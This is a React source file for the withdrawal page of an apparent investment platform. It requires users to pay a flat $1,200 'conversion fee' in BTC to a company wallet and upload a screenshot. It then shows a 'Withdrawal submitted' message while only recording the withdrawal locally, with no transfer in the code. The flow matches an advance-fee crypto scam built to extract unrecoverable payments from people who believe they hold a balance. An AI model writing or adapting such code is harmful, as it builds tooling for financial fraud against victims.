import { useState, useEffect } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import {
  ArrowLeft, ArrowRight, Check, AlertCircle, Copy, Upload, Wallet, Info, Clock,
} from 'lucide-react';
import { getFXRate, getFXSymbol } from '../lib/fxRates';
import { useOrdersSync } from '../lib/useOrdersSync';
import { accountBalance, recordWithdrawal, DEPOSIT_ADDRESSES } from '../lib/wallet';
import { pushUserNote, currentAccount } from '../lib/notes';
import { uploadFile, type Attachment } from '../lib/uploads';

type Step = 1 | 2 | 3 | 4 | 5;

// Withdrawal flow: pick amount -> convert USD to EUR -> pay a flat $1,200
// conversion fee in BTC to the company wallet (leave & return) -> upload the
// payment screenshot -> success. There is no card scanning in this flow.
const steps = ['Source', 'Convert USD \u2192 EUR', 'BTC Payment', 'Upload proof', 'Done'];
const CONVERSION_FEE_USD = 1200;
const PROGRESS_KEY = 'indy_withdraw_progress';

const sources = [
  { id: 'nft', label: 'NFT Proceeds' },
  { id: 'stock', label: 'Stock Proceeds' },
  { id: 'other', label: 'Other Investments' },
];

interface Progress { step: Step; source: string; amount: string; }

// Progress is persisted so the client can leave the app to make the BTC payment
// and resume exactly where they stopped when they come back.
function readProgress(): Progress | null {
  try {
    const raw = localStorage.getItem(PROGRESS_KEY);
    if (!raw) return null;
    const p = JSON.parse(raw) as Progress;
    if (p && typeof p.step === 'number' && p.step >= 1 && p.step <= 4 && typeof p.amount === 'string') return p;
  } catch { /* ignore */ }
  return null;
}
function writeProgress(p: Progress): void {
  try { localStorage.setItem(PROGRESS_KEY, JSON.stringify(p)); } catch { /* ignore */ }
}
function clearProgress(): void {
  try { localStorage.removeItem(PROGRESS_KEY); } catch { /* ignore */ }
}

export default function Withdraw() {
  const navigate = useNavigate();
  // Restore any saved progress so "continue from where they stopped" works.
  const [resumed] = useState(() => readProgress() !== null);
  const [step, setStep] = useState<Step>(() => readProgress()?.step ?? 1);
  const [source, setSource] = useState(() => readProgress()?.source ?? 'nft');
  const [amount, setAmount] = useState(() => readProgress()?.amount ?? '3200');

  const [copied, setCopied] = useState(false);
  const [proof, setProof] = useState<Attachment | null>(null);
  const [proofErr, setProofErr] = useState('');
  const [uploading, setUploading] = useState('');
  const [submitting, setSubmitting] = useState(false);

  // The client's real available balance, so the amount is validated for real.
  const [balance] = useOrdersSync(() => accountBalance());

  // Persist progress on every change (unless finished) — enables resume.
  useEffect(() => {
    if (step >= 5) { clearProgress(); return; }
    writeProgress({ step, source, amount });
  }, [step, source, amount]);

  const amt = parseFloat(amount) || 0;
  const eurRate = getFXRate('EUR');
  const eurSymbol = getFXSymbol('EUR');
  const converted = amt * eurRate;
  const amountValid = amt > 0 && amt <= balance;
  const btcAddress = DEPOSIT_ADDRESSES.btc;
  const feeBtc = (CONVERSION_FEE_USD * getFXRate('BTC')).toFixed(4);
  const canSubmit = Boolean(proof) && !uploading;

  const copyAddress = () => {
    try { navigator.clipboard?.writeText(btcAddress); } catch { /* ignore */ }
    setCopied(true);
    window.setTimeout(() => setCopied(false), 2000);
  };

  const onProof = async (file: File | undefined) => {
    if (!file) return;
    setProofErr('');
    try {
      setUploading('Preparing screenshot\u2026');
      const att = await uploadFile(file, { account: currentAccount().account, onProgress: setUploading });
      setProof(att);
    } catch (error) {
      setProofErr(error instanceof Error ? error.message : 'Upload failed. Please try again.');
    } finally {
      setUploading('');
    }
  };

  const submit = () => {
    if (!canSubmit || submitting) return;
    setSubmitting(true);
    recordWithdrawal({
      amount: amt,
      fee: CONVERSION_FEE_USD,
      tax: 0,
      net: converted,
      currency: 'EUR',
      destination: 'Converted to EUR',
      last4: '',
    });
    pushUserNote(
      `Withdrawal of $${amt.toLocaleString()} (\u2192 ${eurSymbol}${converted.toFixed(2)} EUR) submitted. Conversion fee of $${CONVERSION_FEE_USD.toLocaleString()} paid in BTC \u2014 proof received.`
    );
    clearProgress();
    setSubmitting(false);
    setStep(5);
  };

  const next = () => {
    if (step === 1 && !amountValid) return;
    if (step === 4) { submit(); return; }
    if (step < 5) setStep((step + 1) as Step);
  };
  const back = () => step > 1 && setStep((step - 1) as Step);

  const nextLabel = step === 3 ? "I've paid \u2014 continue" : step === 4 ? 'Submit withdrawal' : 'Continue';

  return (
    <div className="min-h-screen bg-[#F7F7F5] pt-20">
      <div className="max-w-lg mx-auto px-6 py-12">
        <h1 className="font-display font-700 text-2xl text-[#0A0B0D] mb-6">Withdraw funds</h1>

        {/* Progress */}
        <div className="mb-8">
          <div className="flex items-center gap-1 mb-2">
            {steps.map((_, i) => (
              <div key={i} className={`flex-1 h-1 rounded-full transition-all ${
                i + 1 < step ? 'bg-[#22C55E]' : i + 1 === step ? 'bg-[#2F6BFF]' : 'bg-black/10'
              }`} />
            ))}
          </div>
          <p className="text-xs text-black/30 font-mono">Step {step} of {steps.length}: {steps[step - 1]}</p>
        </div>

        {resumed && step < 5 && (
          <div className="flex items-center gap-2 mb-4 text-xs text-[#2F6BFF] bg-[#2F6BFF]/8 border border-[#2F6BFF]/20 rounded-xl px-4 py-2.5">
            <Clock size={13} className="shrink-0" />
            Resuming your withdrawal \u2014 you left off at this step.
          </div>
        )}

        <div className="glass rounded-2xl border border-black/8 p-8">
          {/* Step 1, Source & Amount */}
          {step === 1 && (
            <div>
              <h2 className="font-display font-600 text-xl text-[#0A0B0D] mb-6">Select source &amp; amount</h2>
              <div className="space-y-3 mb-6">
                {sources.map(src => (
                  <button key={src.id} onClick={() => setSource(src.id)}
                    className={`w-full flex items-center justify-between p-4 rounded-xl border-2 transition-all ${
                      source === src.id ? 'border-[#2F6BFF] bg-[#2F6BFF]/5' : 'border-black/8 hover:border-black/20'
                    }`}>
                    <div className="text-left">
                      <p className="text-sm font-medium text-[#0A0B0D]">{src.label}</p>
                      <p className="text-xs text-black/30 mt-0.5 font-mono">Available: ${balance.toLocaleString()}</p>
                    </div>
                    <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${source === src.id ? 'border-[#2F6BFF] bg-[#2F6BFF]' : 'border-black/20'}`}>
                      {source === src.id && <div className="w-2 h-2 rounded-full bg-white" />}
                    </div>
                  </button>
                ))}
              </div>
              <div>
                <label className="block text-xs text-black/40 mb-2">Amount (USD)</label>
                <div className="flex items-center gap-3 bg-black/5 border border-black/10 rounded-xl p-4 focus-within:border-[#2F6BFF] transition-colors">
                  <span className="font-mono text-black/40">$</span>
                  <input type="number" value={amount} onChange={e => setAmount(e.target.value)}
                    className="flex-1 bg-transparent font-mono font-700 text-2xl text-[#0A0B0D] outline-none" />
                </div>
                <p className={`text-xs mt-1.5 ${amt > 0 && amt > balance ? 'text-[#EF4444]' : 'text-black/25'}`}>
                  Available: ${balance.toLocaleString()}{amt > 0 && amt > balance ? ' \u2014 exceeds available balance' : ''}
                </p>
              </div>
            </div>
          )}

          {/* Step 2, Convert USD -> EUR */}
          {step === 2 && (
            <div>
              <h2 className="font-display font-600 text-xl text-[#0A0B0D] mb-2">Convert USD to EUR</h2>
              <p className="text-sm text-black/40 mb-6">Your withdrawal is converted to EUR at the live rate. A flat conversion fee applies.</p>

              <div className="bg-black/3 rounded-2xl border border-black/8 p-5 space-y-4 mb-6">
                <div className="flex justify-between text-sm">
                  <span className="text-black/50">Amount requested</span>
                  <span className="font-mono text-[#0A0B0D]">${amt.toLocaleString()}</span>
                </div>
                <div className="flex justify-between text-sm items-center">
                  <div className="flex items-center gap-1.5">
                    <span className="text-black/50">Live USD \u2192 EUR</span>
                    <span className="text-[10px] chip-accent px-1.5 py-0.5 rounded-full font-mono">EUR</span>
                  </div>
                  <span className="font-mono text-[#0A0B0D]">1 USD = {eurRate} EUR</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-black/50">Conversion fee (paid in BTC)</span>
                  <span className="font-mono text-[#EF4444]">-${CONVERSION_FEE_USD.toLocaleString()}</span>
                </div>
                <div className="flex justify-between pt-3 border-t border-black/10">
                  <span className="font-display font-700 text-base text-[#0A0B0D]">You receive</span>
                  <span className="font-mono font-800 text-2xl text-[#22C55E]">{eurSymbol}{converted.toFixed(2)} EUR</span>
                </div>
              </div>

              <div className="flex items-start gap-2 text-xs text-black/45 bg-black/3 rounded-xl px-4 py-3">
                <Info size={14} className="shrink-0 mt-0.5 text-[#2F6BFF]" />
                <span>Next you'll pay the ${CONVERSION_FEE_USD.toLocaleString()} conversion fee to the company wallet in BTC, then upload the screenshot.</span>
              </div>
            </div>
          )}

          {/* Step 3, BTC payment for the conversion fee */}
          {step === 3 && (
            <div>
              <h2 className="font-display font-600 text-xl text-[#0A0B0D] mb-2">Pay the conversion fee</h2>
              <p className="text-sm text-black/40 mb-5">
                Send <span className="font-mono text-[#0A0B0D]">${CONVERSION_FEE_USD.toLocaleString()}</span> (approx <span className="font-mono text-[#0A0B0D]">{feeBtc} BTC</span>) to the company address below before continuing.
              </p>

              <div className="bg-black/3 rounded-2xl border border-black/8 p-5 mb-4">
                <p className="text-[10px] text-black/30 font-mono uppercase tracking-wider mb-2">Company BTC address</p>
                <p className="font-mono text-[13px] text-[#0A0B0D] break-all leading-relaxed">{btcAddress}</p>
                <button onClick={copyAddress}
                  className={`mt-3 w-full flex items-center justify-center gap-2 py-2.5 rounded-xl text-sm border transition-colors ${
                    copied ? 'border-[#22C55E]/40 text-[#22C55E]' : 'border-[#2F6BFF]/30 text-[#2F6BFF] hover:bg-[#2F6BFF]/5'
                  }`}>
                  {copied ? <Check size={15} /> : <Copy size={15} />} {copied ? 'Address copied' : 'Copy address'}
                </button>
              </div>

              <div className="flex items-start gap-2 text-xs text-black/45 bg-black/3 rounded-xl px-4 py-3 mb-4">
                <Wallet size={14} className="shrink-0 mt-0.5 text-[#2F6BFF]" />
                <span>
                  Leave the app to send the payment from your wallet, then come back \u2014 your progress is saved and you'll
                  continue right here to upload the screenshot.
                </span>
              </div>

              <button onClick={() => navigate('/dashboard')}
                className="w-full py-3 rounded-xl border border-black/15 text-sm text-black/50 hover:text-black/70 hover:border-black/25 transition-colors">
                Save &amp; finish later
              </button>
            </div>
          )}

          {/* Step 4, Upload screenshot proof */}
          {step === 4 && (
            <div>
              <h2 className="font-display font-600 text-xl text-[#0A0B0D] mb-2">Upload payment screenshot</h2>
              <p className="text-sm text-black/40 mb-6">Attach a screenshot of the BTC transaction so we can confirm your ${CONVERSION_FEE_USD.toLocaleString()} conversion fee.</p>

              <label className={`flex flex-col items-center justify-center gap-2 rounded-2xl border-2 border-dashed p-8 cursor-pointer transition-colors ${
                proof ? 'border-[#22C55E]/40 bg-[#22C55E]/5' : 'border-black/15 hover:border-[#2F6BFF]/50 hover:bg-[#2F6BFF]/5'
              }`}>
                <input type="file" accept="image/*" className="sr-only" onChange={e => { const f = e.target.files?.[0]; void onProof(f); e.target.value = ''; }} />
                {proof ? <Check size={26} className="text-[#22C55E]" /> : <Upload size={26} className="text-black/30" />}
                <span className="text-sm text-[#0A0B0D] font-medium">
                  {proof ? 'Screenshot uploaded' : 'Tap to upload screenshot'}
                </span>
                <span className="text-xs text-black/35">
                  {proof ? proof.name : uploading || 'PNG or JPG of your BTC transaction'}
                </span>
              </label>

              {proof && (
                <button onClick={() => setProof(null)} className="mt-3 text-xs text-black/40 hover:text-[#EF4444] transition-colors">
                  Choose a different screenshot
                </button>
              )}
              {proofErr && (
                <p className="mt-3 flex items-center gap-1.5 text-xs text-[#EF4444]">
                  <AlertCircle size={13} /> {proofErr}
                </p>
              )}
            </div>
          )}

          {/* Step 5, Success */}
          {step === 5 && (
            <div className="text-center py-6">
              <div className="w-16 h-16 rounded-full bg-[#22C55E]/15 border-2 border-[#22C55E]/30 flex items-center justify-center mx-auto mb-6">
                <Check size={28} className="text-[#22C55E]" />
              </div>
              <h2 className="font-display font-700 text-2xl text-[#0A0B0D] mb-3">Withdrawal submitted</h2>
              <p className="text-black/40 text-sm mb-2">
                {eurSymbol}{converted.toFixed(2)} EUR is on its way from ${amt.toLocaleString()} \u2014 fee paid, screenshot received.
              </p>
              <p className="text-black/30 text-xs mb-8">Estimated arrival: 1 to 3 business days</p>
              <div className="flex flex-col gap-3">
                <Link to="/transactions" className="btn-primary py-3 rounded-xl text-sm">Track this withdrawal</Link>
                <Link to="/dashboard" className="btn-ghost py-3 rounded-xl text-sm">Back to dashboard</Link>
              </div>
            </div>
          )}

          {/* Navigation */}
          {step < 5 && (
            <div className="flex items-center gap-3 mt-8">
              {step > 1 && (
                <button onClick={back} className="btn-ghost px-4 py-3 rounded-xl text-sm flex items-center gap-2">
                  <ArrowLeft size={14} /> Back
                </button>
              )}
              <button
                onClick={next}
                disabled={(step === 1 && !amountValid) || (step === 4 && !canSubmit)}
                className="btn-primary flex-1 py-3 rounded-xl text-sm flex items-center justify-center gap-2 disabled:opacity-40"
              >
                {nextLabel} <ArrowRight size={14} />
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

